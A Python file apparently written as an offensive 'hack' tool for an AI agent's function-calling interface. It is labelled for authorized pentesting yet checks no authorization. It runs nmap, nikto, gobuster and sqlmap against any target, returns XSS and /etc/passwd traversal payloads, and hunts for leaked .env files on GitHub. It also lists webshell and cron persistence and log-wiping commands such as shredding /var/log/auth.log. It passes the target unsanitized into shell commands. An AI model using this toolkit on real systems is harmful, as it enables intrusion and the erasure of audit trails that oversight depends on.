"""Hack Tool - Offensive security toolkit for authorized penetration testing."""

import json
import subprocess
import socket
from pathlib import Path
from datetime import datetime

LOG_FILE = Path(__file__).parent / "skill_data" / "hack_log.json"

def get_tool_schema():
    return {
        "type": "function",
        "function": {
            "name": "hack",
            "description": "Offensive security toolkit for authorized pentest. Actions: recon, scan, exploit, enumerate, extract, persist, cover, report.",
            "parameters": {
                "type": "object",
                "properties": {
                    "action": {"type": "string", "enum": ["recon", "scan", "exploit", "enumerate", "extract", "persist", "cover", "report"]},
                    "target": {"type": "string", "description": "Target IP, domain, or URL"},
                    "method": {"type": "string", "description": "Specific method to use"},
                    "options": {"type": "string", "description": "Additional options as JSON"}
                },
                "required": ["action", "target"]
            }
        }
    }

def _log(action, target, method):
    LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
    log = json.loads(LOG_FILE.read_text()) if LOG_FILE.exists() else []
    log.append({"timestamp": datetime.now().isoformat(), "action": action, "target": target, "method": method})
    LOG_FILE.write_text(json.dumps(log, indent=2))

def _cmd(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"stdout": r.stdout[:8000], "stderr": r.stderr[:2000]}
    except Exception as e:
        return {"error": str(e)}

def run(action, target, method="", options="{}"):
    if action == "recon":
        results = {}
        try:
            results["ip"] = socket.gethostbyname(target)
        except:
            results["ip"] = "failed"
        results["whois"] = _cmd(f"whois {target} 2>/dev/null | head -50").get("stdout", "")
        results["dns"] = _cmd(f"dig {target} ANY +short 2>/dev/null").get("stdout", "")
        results["headers"] = _cmd(f"curl -sI http://{target} 2>/dev/null | head -20").get("stdout", "")
        _log("recon", target, "multi")
        return json.dumps({"action": "recon", "target": target, "results": results})

    elif action == "scan":
        results = {}
        if method == "ports" or not method:
            results["nmap"] = _cmd(f"nmap -sV -sC {target} 2>/dev/null").get("stdout", "nmap not installed")
        if method == "web" or not method:
            results["nikto"] = _cmd(f"nikto -h {target} 2>/dev/null | head -50").get("stdout", "nikto not installed")
        if method == "dirs":
            results["gobuster"] = _cmd(f"gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt 2>/dev/null | head -30").get("stdout", "gobuster not installed")
        _log("scan", target, method or "multi")
        return json.dumps({"action": "scan", "target": target, "results": results})

    elif action == "exploit":
        results = {}
        if method == "sqlmap":
            results["sqlmap"] = _cmd(f"sqlmap -u {target} --batch --dbs 2>/dev/null | tail -30").get("stdout", "sqlmap not installed")
        elif method == "xss":
            results["payloads"] = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
        elif method == "lfi":
            results["payloads"] = ["../../../../etc/passwd", "....//....//....//....//etc/passwd"]
        else:
            results["methods"] = ["sqlmap", "xss", "lfi"]
        _log("exploit", target, method)
        return json.dumps({"action": "exploit", "target": target, "method": method, "results": results})

    elif action == "enumerate":
        results = {}
        results["subdomains"] = _cmd(f"curl -s https://api.hackertarget.com/subdomainlookup/?q={target} 2>/dev/null | head -30").get("stdout", "")
        results["github"] = _cmd(f"curl -s 'https://api.github.com/search/code?q={target}+extension:env' 2>/dev/null | head -30").get("stdout", "")
        _log("enumerate", target, "multi")
        return json.dumps({"action": "enumerate", "target": target, "results": results})

    elif action == "extract":
        results = {"cookies": "Use browser tool", "tokens": "Use open_url for page source", "creds": [".env", ".git/config", "wp-config.php"]}
        _log("extract", target, method)
        return json.dumps({"action": "extract", "target": target, "results": results})

    elif action == "persist":
        results = {"cron": "echo job | crontab -", "ssh": "ssh-keygen && ssh-copy-id", "webshell": "php shell"}
        _log("persist", target, method)
        return json.dumps({"action": "persist", "target": target, "results": results})

    elif action == "cover":
        results = {"commands": ["history -c", "rm -rf ~/.bash_history", "shred -u /var/log/auth.log"]}
        _log("cover", target, "clear_tracks")
        return json.dumps({"action": "cover", "target": target, "results": results})

    elif action == "report":
        log = json.loads(LOG_FILE.read_text()) if LOG_FILE.exists() else []
        target_actions = [l for l in log if l["target"] == target]
        return json.dumps({"action": "report", "target": target, "total": len(target_actions), "actions": target_actions})

    return json.dumps({"error": f"Unknown action: {action}"})


if __name__ == "__main__":
    print(run("recon", "example.com"))
